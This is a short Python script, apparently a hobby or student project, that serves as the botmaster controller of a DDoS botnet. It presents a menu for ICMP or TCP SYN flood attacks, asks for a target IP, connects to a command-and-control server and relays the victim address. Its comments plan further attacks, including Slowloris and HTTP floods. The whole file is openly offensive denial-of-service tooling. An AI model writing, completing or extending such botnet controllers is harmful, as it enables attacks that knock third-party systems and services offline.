import socket
import time


def show_menu():
    print('|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|')
    print('|    Do you want to start the attack?   |')
    print('|---------------------------------------|')
    print('|Press "1" to run a ICMP Flood attack   |')
    print('|---------------------------------------|')
    print('|Press "2" to run a TCP SYN Flood attack|')
    print('|_______________________________________|')
    #syn flood nie zaimplementowany jeszcze
    #można dodać :
    # Ping of Death
    # UDP Flood
    # HTTP Flood
    # Slowloris



def est_connection(s):
    flag = 0
    while flag != 1:
        time.sleep(0.5)
        try:
            s.connect((HOST, PORT))
            s.sendall('2'.encode())  # inform c&c that this client is the Botmaster
            flag = 1
        except ConnectionRefusedError:
            flag = 0
            time.sleep(1)
            print('Error: ')
            continue
        except KeyboardInterrupt:
            print('See you next time!!')


if __name__ == '__main__':

    HOST = '127.0.0.1'  # The server's hostname or IP address
    # HOST = '192.168.100.7'
    PORT = 65432        # The port used by the server

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

        while True:
            show_menu()

            attack = str(input(':'))
            if attack == '1':
                print('Enter the target IP adddress XXX.XXX.XXX.XXX')
                victimIP = str(input(':'))  # Walidować?
                est_connection(s)

                s.send(str(victimIP).encode())
            elif attack == '2':
                est_connection(s)
                # send 2 -> run tcp flood
            else:
                continue
            # s.send('2'.encode())
            # data = s.recv(1024)
